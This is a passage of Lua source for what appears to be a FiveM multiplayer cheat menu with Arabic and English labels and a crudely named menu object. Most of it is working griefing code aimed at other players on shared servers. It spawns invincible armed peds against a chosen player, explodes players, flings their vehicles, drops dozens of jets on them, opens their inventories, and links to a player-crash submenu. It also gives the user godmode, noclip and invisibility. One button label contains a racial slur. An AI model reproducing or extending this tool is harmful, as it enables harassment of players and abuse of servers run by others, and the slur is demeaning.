						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z + 15, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~Spawn ~s~Whale  ~y~Holding Rpg") then
				local hp = "a_c_humpback"
				local bR = "weapon_rpg"
				for i = 0, 10 do
					local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
					RequestModel(GetHashKey(hp))
					Citizen.Wait(50)
					if HasModelLoaded(GetHashKey(hp)) then
						local ped = CreatePed(21, GetHashKey(hp), hn.x + i, hn.y - i, hn.z + 15, 0, true, true)
						NetworkRegisterEntityAsNetworked(ped)
						if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(selectedPlayer)) then
							local hf = PedToNet(ped)
							NetworkSetNetworkIdDynamic(hf, false)
							SetNetworkIdCanMigrate(hf, true)
							SetNetworkIdExistsOnAllMachines(hf, true)
							Citizen.Wait(50)
							NetToPed(hf)
							GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
							SetEntityInvincible(ped, true)
							SetPedCanSwitchWeapon(ped, true)
							TaskCombatPed(ped, GetPlayerPed(selectedPlayer), 0, 16)
						elseif IsEntityDead(GetPlayerPed(selectedPlayer)) then
							TaskCombatHatedTargetsInArea(ped, hn.x, hn.y, hn.z, 500)
						else
							Citizen.Wait(0)
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("Nearby Peds Attack Player") then
				ez(selectedPlayer, PedAttackType)
			elseif IhadSexWithMyStepMother.ComboBox("Ped Attack Type", PedAttackOps, gl, gm, function(aD, aE)
				gl = aD;
				gm = aD;
				PedAttackType = aD
			end) then
			elseif IhadSexWithMyStepMother.Button("Possess Player Vehicle") then
				if Spectating then
					SpectatePlayer(selectedPlayer)
				end;
				ee(selectedPlayer)
			elseif IhadSexWithMyStepMother.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: " .. GetPlayerName(gH)) then
				Tracking = not Tracking;
				gH = selectedPlayer
			elseif IhadSexWithMyStepMother.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: " .. GetPlayerName(gJ)) then
				FlingingPlayer = not FlingingPlayer;
				gJ = selectedPlayer
			elseif IhadSexWithMyStepMother.Button("Launch Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
					local hq = false;
					local hr = nil;
					if Spectating then
						hr = gI;
						hq = true;
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end;
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, 5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					if hq then
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Slam Players Vehicle") then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
					local hq = false;
					local hr = nil;
					if Spectating then
						hr = gI;
						hq = true;
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end;
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					ApplyForceToEntity(veh, 3, 0.0, 0.0, -5000000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
					if hq then
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end
				end
			elseif IhadSexWithMyStepMother.ComboBox("Pop Players Vehicle Tire", {
				"Front Left",
				"Front Right",
				"Back Left",
				"Back Right",
				"All"
			}, fZ, f_, function(aD, gg)
				fZ = aD;
				f_ = aD
			end) then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~Player Not In Vehicle!")
				else
					local hq = false;
					local hr = nil;
					if Spectating then
						hr = gI;
						hq = true;
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end;
					local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
					RequestControlOnce(veh)
					if f_ == 1 then
						SetVehicleTyreBurst(veh, 0, 1, 1000.0)
					elseif f_ == 2 then
						SetVehicleTyreBurst(veh, 1, 1, 1000.0)
					elseif f_ == 3 then
						SetVehicleTyreBurst(veh, 4, 1, 1000.0)
					elseif f_ == 4 then
						SetVehicleTyreBurst(veh, 5, 1, 1000.0)
					elseif f_ == 5 then
						for i = 0, 7 do
							SetVehicleTyreBurst(veh, i, 1, 1000.0)
						end
					end;
					if hq then
						Spectating = not Spectating;
						SpectatePlayer(hr)
					end
				end
			elseif IhadSexWithMyStepMother.Button("Explode Player") then
				ew(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("Silent Kill Player") then
				local bs = GetEntityCoords(GetPlayerPed(selectedPlayer))
				AddExplosion(bs.x, bs.y, bs.z, 4, 0.1, 0, 1, 0.0)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("weaponspawnerplayer") then
			for i = 1, #bT do
				if IhadSexWithMyStepMother.Button(bT[i]) then
					GiveWeaponToPed(GetPlayerPed(selectedPlayer), GetHashKey(bT[i]), 250, false, true)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("playeroptions") then
			if IhadSexWithMyStepMother.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
			elseif IhadSexWithMyStepMother.CheckBox("~g~ﺐﻋﻸﻟ ﺖﻴﺘﻜﺒﺳ", Spectating, "Spectating: ~m~OFF", "Spectating: " .. GetPlayerName(gI)) then
				Spectating = not Spectating;
				SpectatePlayer(selectedPlayer)
				gI = selectedPlayer
			elseif IhadSexWithMyStepMother.Button("ﺐﻋﻻ ﻰﻟﺍ ﻝﺎﻘﺘﻧﺍ") then
				local hs = e9("؟ ﺪﻛﺄﺘﻣ ﺖﻧﺍ ﻞﻫ? ~g~Y/~r~N")
				if string.lower(hs) == "y" then
					e_(selectedPlayer)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.ComboBox("ﺐﻋﻷﺍ ﺓﺭﺎﻴﺳ ﻰﻟﺍ ﻝﺎﻘﺘﻧﺍ~h~~r~ -->", {
				"ﻦﻴﻤﻳ ﻡﺍﺪﻗ",
				"ﺭﺎﺴﻳ ﺍﺭﻭ",
				"ﻦﻴﻤﻳ ﺍﺭﻭ"
			}, fX, fY, function(aD, gg)
				fX = aD;
				fY = aD
			end) then
				if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
					ShowInfo("~r~ﺓﺭﺎﻴﺳ ﻲﻓ ﺲﻴﻟ ﺐﻋﻻ!")
				else
					local hs = e9("؟ ﺪﻛﺄﺘﻣ ﺖﻧﺍ ﻞﻫ? ~g~Y/~r~N")
					if string.lower(hs) == "y" then
						local veh = GetVehiclePedIsIn(GetPlayerPed(selectedPlayer), 0)
						if fY == 1 then
							if IsVehicleSeatFree(veh, 0) then
								SetPedIntoVehicle(PlayerPedId(), veh, 0)
							else
								ShowInfo("~r~Seat Taken Or Does Not Exist!")
							end
						elseif fY == 2 then
							if IsVehicleSeatFree(veh, 1) then
								SetPedIntoVehicle(PlayerPedId(), veh, 1)
							else
								ShowInfo("~r~Seat Taken Or Does Not Exist!")
							end
						elseif fY == 3 then
							if IsVehicleSeatFree(veh, 2) then
								SetPedIntoVehicle(PlayerPedId(), veh, 2)
							else
								ShowInfo("~r~Seat Taken Or Does Not Exist!")
							end
						end
					end
				end
			elseif IhadSexWithMyStepMother.Button("~r~ﺓﺭﺎﻴﺴﻟﺍ ﻦﻣ ﺩﺮﻃ") then
				eS(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("~g~ﺐﻋﻻﺍ ﻦﻜﺳ ﺦﺴﻧ ~r~") then
				dW(selectedPlayer)
				ShowInfo("~g~ﺦﺴﻨﻟﺍ ﻢﺗ!")
			elseif IhadSexWithMyStepMother.Button("~g~ESX ~s ﺵﺎﻌﻧﺍ ~r~") then
				local hs = e9("؟ ﺪﻛﺄﺘﻣ ﺖﻧﺍ ﻞﻫ ﺪﻧﺎﺒﻠﻟ ﻚﺿﺮﻌﻳ ﻦﻜﻤﻣ ﻲﺸﻟﺍ ﺍﺬﻫ ~g~Y/~r~N")
				if string.lower(hs) == "y" then
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button("~b~VRP ~s~ﺵﺎﻌﻧﺍ") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				CreateAmbientPickup(GetHashKey("PICKUP_HEALTH_STANDARD"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("PICKUP_HEALTH_STANDARD"), 1, 0)
				SetPickupRegenerationTime(pickup, 60)
			elseif IhadSexWithMyStepMother.MenuButton("~b~ﺐﻋﻼﻟ ﺵﺍﺮﻛ", "crashtroll") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺐﻋﻻﺍ ﻰﻠﻋ ﺕﺎﺘﻜﺠﺑﻭﺍ ﻦﺒﺳﺮﺗ", "troll") then
			elseif IhadSexWithMyStepMother.MenuButton("~ﺡﻼﺳ ﻲﻄﻌﺗ", "weaponspawnerplayer") then
			elseif IhadSexWithMyStepMother.Button("~b~ﺔﺤﻠﺳﻷﺍ ﻞﻛ ﻲﻄﻌﺗ") then
				eW(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("~r~ﺔﺤﻠﺳﻷﺍ ﻞﻛ ﻞﻴﺸﺗ") then
				eQ(selectedPlayer)
			elseif IhadSexWithMyStepMother.Button("~b~ﻉﺭﺩ ﻲﻄﻌﺗ") then
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				for i = 0, 99 do
					Citizen.Wait(0)
					CreateAmbientPickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("PICKUP_ARMOUR_STANDARD"), 1, 0)
					SetPickupRegenerationTime(pickup, 10)
					i = i + 1
				end
			elseif IhadSexWithMyStepMother.Button("~r~ﺐﻋﻻﺍ ﺢﺑﺬﺗ") then
				AddExplosion(GetEntityCoords(GetPlayerPed(selectedPlayer)), 33, 101.0, false, true, 0.0)
			elseif IhadSexWithMyStepMother.Button("~r~50x ﺐﻋﻻﺍ ﻰﻠﻋ ﺕﺍﺭﺎﻴﻃ ﻦﺒﺳﺮﺗ") then
				local ht = "phantom"
				local hu = "CARGOPLANE"
				local hv = "luxor"
				local hw = "maverick"
				local hx = "bus"
				local hn = GetEntityCoords(GetPlayerPed(selectedPlayer))
				for i = 0, 99 do
					Citizen.Wait(0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
					CreateObject(GetHashKey("prop_med_jet_01"), hn.x, hn.y, hn.z + 1.0, 1, 1, GetHashKey("prop_med_jet_01"), 1, 0)
				end
			elseif IhadSexWithMyStepMother.Button("~g~ﺔﺒﻴﻘﺣ ﺢﺘﻔﺗ (ESX)") then
				TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(selectedPlayer), GetPlayerName(selectedPlayer))
			elseif IhadSexWithMyStepMother.Button("ﺔﻛﺮﺤﻟﺍ ﺀﺎﻐﻟﺍ") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("self") then
			if IhadSexWithMyStepMother.MenuButton("ﺲﺑﻼﻤﻟﺍ ﺔﻤﺋﺎﻗ ", "appearance") then
			end;
			if IhadSexWithMyStepMother.CheckBox("ﺩﻮﻣ ﺩﻮﻗ", Godmode) then
				Godmode = not Godmode;
				f5(Godmode)
			elseif IhadSexWithMyStepMother.CheckBox("ﻲﺋﺎﻘﻠﺗ ﻚﺸﻌﻨﻳ ﺕﻮﻤﺗ ﺎﻤﻟ", Demigod) then
				Demigod = not Demigod
			elseif IhadSexWithMyStepMother.Button("ﻲﺋﺍﻮﺸﻋ ﻦﻜﺳ") then
				eV(PlayerId())
			elseif IhadSexWithMyStepMother.Button("ﺵﺎﻌﻧﺍ", "Native") then
				ReviveKubca()
			elseif IhadSexWithMyStepMother.ComboBox("~b~ﻡﺪﻟﺍ ﺔﺌﺒﻌﺗ ﻭ ﺵﺎﻌﻧﺍ -->", {
				"VRP ~s~Re.vive",
				"Give ~s~Player A.rmor",
				"Remove ~s~Player Ar.mor",
				"Clean Player",
				"Sui.cide ",
				"Cancel Anim/Task"
			}, fT, fU, function(aD, gg)
				fT = aD;
				fU = aD
			end) then
				if fU == 1 then
					SetEntityHealth(PlayerPedId(), 200)
				elseif fU == 2 then
					SetPedArmour(PlayerPedId(), 100)
				elseif fU == 3 then
					SetPedArmour(PlayerPedId(), 0)
				elseif fU == 4 then
					ClearPedBloodDamage(PlayerPedId())
					ClearPedWetness(PlayerPedId())
					ClearPedEnvDirt(PlayerPedId())
					ResetPedVisibleDamage(PlayerPedId())
				elseif fU == 5 then
					SetEntityHealth(PlayerPedId(), 0)
				elseif fU == 6 then
					ClearPedTasksImmediately(PlayerPedId())
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﺐﻋﻻﺍ ﺐﻌﺘﻳ ﺎﻣ", InfStamina) then
				InfStamina = not InfStamina
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ﺐﻋﻻﺍ ﻊﻳﺮﺴﺗ", FastCBWords, g4, g5, function(aD, gg)
				g4 = aD;
				g5 = aD;
				FastRunMultiplier = FastCB[aD]
				SetRunSprintMultiplierForPlayer(PlayerId(), FastRunMultiplier)
			end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ﺔﺣﺎﺒﺴﻟﺍ ﺔﻋﺮﺳ ﻊﻳﺮﺴﺗ", FastCBWords, g6, g7, function(aD, gg)
				g6 = aD;
				g7 = aD;
				FastSwimMultiplier = FastCB[aD]
				SetSwimMultiplierForPlayer(PlayerId(), FastSwimMultiplier)
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("ﻲﻟﺎﻋ ﺰﻔﻗ", SuperJump) then
				SuperJump = not SuperJump
			elseif IhadSexWithMyStepMother.CheckBox("ﺀﺎﻔﺘﺧﺍ", Invisibility) then
				Invisibility = not Invisibility;
				if not Invisibility then
					SetEntityVisible(PlayerPedId(), true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﻂﻐﺿﺍ ﻡﺍﺪﺘﺨﺳﻸﻟ ﺲﻴﻃﺎﻨﻐﻤﻟﺍ ~f~[E]", ForceTog) then
				cA()
			elseif IhadSexWithMyStepMother.CheckBox("ﺲﻴﻃﺎﻨﻐﻤﻟﺍ ﻥﻭﺯ", Forcefield) then
				Forcefield = not Forcefield
			elseif IhadSexWithMyStepMother.ComboBox("ﺲﻴﻃﺎﻨﻐﻤﻟﺍ ﻥﻭﺰﺑ ﻢﻜﺤﺗ -->", ForcefieldRadiusOps, g2, g3, function(aD, aE)
				g2 = aD;
				g3 = aD;
				ForcefieldRadius = ForcefieldRadiusOps[aD]
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("ﻥﺍﺮﻴﻃ", Noclipping) then
				f7()
			elseif IhadSexWithMyStepMother.ComboBox("ﻥﺍﺮﻴﻄﻟﺍ ﺔﻋﺮﺳ -->", NoclipSpeedOps, g0, g1, function(aD, aE)
				g0 = aD;
				g1 = aD;
				NoclipSpeed = NoclipSpeedOps[g0]
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("appearance") then
			if IhadSexWithMyStepMother.MenuButton("Models", "skinsmodels") then
			elseif IhadSexWithMyStepMother.Button("Set Model Name") then
				local fn = e9("Enter Model Name:")
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				else
					ShowInfo("~r~Model not recognized (Try Again)")
				end
			elseif IhadSexWithMyStepMother.MenuButton("Modify Skin Textures", "modifyskintextures") then
			elseif IhadSexWithMyStepMother.ComboBox("Save Outfit", ClothingSlots, gf, gg, function(aD, aE)
				gf = aD;
				gg = aD
			end) then
				ge[gg] = fu(PlayerId())
			elseif IhadSexWithMyStepMother.ComboBox("Load Outfit", ClothingSlots, gf, gg, function(aD, aE)
				gf = aD;
				gg = aD
			end) then
				fv(ge[gg])
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("modifyskintextures") then
			if IhadSexWithMyStepMother.MenuButton("Head", "modifyhead") then
				if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
					IhadSexWithMyStepMother.CloseMenu()
					IhadSexWithMyStepMother.OpenMenu("modifyskintextures")
					ShowInfo("~r~Only MP Models Supported For Now!")
				end;
				faceItemsList = dE()
				faceTexturesList = dG(GetPedDrawableVariation(PlayerPedId(), 0))
				hairItemsList = dK()
				hairTexturesList = dM(GetPedDrawableVariation(PlayerPedId(), 2))
				maskItemsList = dP()
				hatItemsList = dR()
				hatTexturesList = dT(GetPedPropIndex(PlayerPedId(), 0))
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("skinsmodels") then
			if IhadSexWithMyStepMother.Button("~g~Reset Model To FiveM Player") then
				local fn = "mp_m_freemode_01"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~p~Naked") then
				local fn = "a_m_m_acult_01"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~p~Nigga") then
				local fn = "csb_grove_str_dlr"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~r~Prison") then
				local fn = "s_m_y_prismuscl_01"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~b~Kuwaiti") then
				local fn = "a_m_m_afriamer_01"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~o~hotie") then
				local fn = "a_f_m_beach_01"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~g~Dog") then
				local fn = "a_c_poodle"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~p~Bird") then
				local fn = "a_c_seagull"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			elseif IhadSexWithMyStepMother.Button("Change To ~o~ LOL") then
				local fn = "a_c_cormorant"
				RequestModel(GetHashKey(fn))
				Wait(500)
				if HasModelLoaded(GetHashKey(fn)) then
					SetPlayerModel(PlayerId(), GetHashKey(fn))
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("modifyhead") then
			if IhadSexWithMyStepMother.ComboBoxSlider("Face", faceItemsList, fF, fG, function(aD, aE)
				fF = aD;
				fG = aD;
				SetPedComponentVariation(PlayerPedId(), 0, faceItemsList[aD] - 1, 0, 0)
				faceTexturesList = dG(faceItemsList[aD] - 1)
			end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("Hair", hairItemsList, fJ, fK, function(aD, aE)
				previousHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
				previousHairTextureDisplay = hairTextureList[fL]
				fJ = aD;
				fK = aD;
				SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[aD] - 1, 0, 0)
				currentHairTexture = GetNumberOfPedTextureVariations(PlayerPedId(), 2, GetPedDrawableVariation(PlayerPedId(), 2))
				hairTextureList = dM(GetPedDrawableVariation(PlayerPedId(), 2))
				if (d == b.left or d == b.right) and previousHairTexture > currentHairTexture and previousHairTextureDisplay > currentHairTexture then
					fL = hairTexturesList[currentHairTexture]
					fM = hairTexturesList[currentHairTexture]
				end
			end) then
			elseif IhadSexWithMyStepMother.ComboBox2("Hair Color", hairTextureList, fL, fM, function(aD, aE)
				fL = aD;
				fM = aD;
				SetPedComponentVariation(PlayerPedId(), 2, hairItemsList[fJ] - 1, aD - 1, 0)
			end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("Mask", maskItemsList, fN, fO, function(aD, aE)
				fN = aD;
				fO = aD;
				SetPedComponentVariation(PlayerPedId(), 1, maskItemsList[aD] - 1, 0, 0)
			end) then
			elseif IhadSexWithMyStepMother.ComboBoxSlider("Hat", hatItemsList, fP, fQ, function(aD, aE)
				previousHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0))
				previousHatTextureDisplay = hatTexturesList[fR]
				fP = aD;
				fQ = aD;
				SetPedPropIndex(PlayerPedId(), 0, hatItemsList[aD] - 1, 0, 0)
				currentHatTexture = GetNumberOfPedPropTextureVariations(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0))
				hatTexturesList = dT(GetPedPropIndex(PlayerPedId(), 0))
				if (d == b.left or d == b.right) and previousHatTexture > currentHatTexture and previousHatTextureDisplay > currentHatTexture then
					print("if condition")
					fR = hatTexturesList[currentHatTexture]
					fS = hatTexturesList[currentHatTexture]
				end
			end) then
			elseif IhadSexWithMyStepMother.ComboBox2("Hat Texture", hatTexturesList, fR, fS, function(aD, aE)
				fR = aD;
				fS = aD;
				SetPedPropIndex(PlayerPedId(), 0, GetPedPropIndex(PlayerPedId(), 0), aD, 0)
			end) then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("WeaponCustomization") then
			if IhadSexWithMyStepMother.ComboBox("ﺡﻼﺴﻟﺍ ﻥﻮﻟ", {
				"ﻱﺩﺎﻋ",
				"ﺮﻀﺧﺍ",
				"ﻲﺒﻫﺫ",
				"ﻱﺩﺭﻭ",
				"ﻲﺸﻴﺟ",
				"ﻲﺴﻴﻟﻮﺑ",
				"ﻲﻟﺎﻘﺗﺮﺑ",
				"ﻲﻀﻓ"
			}, fT, fU, function(aD, gg)
				fT = aD;
				fU = aD
			end) then
				if fU == 1 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
				elseif fU == 2 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
				elseif fU == 3 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
				elseif fU == 4 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
				elseif fU == 5 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
				elseif fU == 6 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
				elseif fU == 7 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
				elseif fU == 8 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
				end
			elseif IhadSexWithMyStepMother.Button("~g~ﻞﻣﺎﻛ ﺡﻼﺴﻟﺍ ﻞﻳﺪﻌﺗ") then
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 663170192)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3610841222)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2608252716)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1215999497)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2242268665)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 930927479)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3634075224)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1319990579)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1077065191)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2008591151)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2053798779)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 371102273)
			elseif IhadSexWithMyStepMother.Button("~r~ﻞﻣﺎﻛ ﺡﻼﺴﻟﺍ ﻞﻳﺪﻌﺗ ﻑﺬﺣ") then
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 663170192)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3610841222)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2608252716)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1215999497)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2242268665)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 930927479)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3634075224)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1319990579)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1077065191)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2008591151)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2053798779)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 371102273)
			elseif IhadSexWithMyStepMother.Button("~g~ﻢﺗﺎﻛ ﺔﻓﺎﺿﺍ") then
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1709866683)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2205435306)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2805810788)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3271853210)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3859329886)
			elseif IhadSexWithMyStepMother.Button("~r~ﻢﺗﺎﻜﻟﺍ ﻑﺬﺣ") then
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1709866683)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2205435306)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2805810788)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3271853210)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3859329886)
			elseif IhadSexWithMyStepMother.Button("~g~ﺏﻮﻜﺳ ﺔﻓﺎﺿﺍ") then
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2637152041)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2698550338)
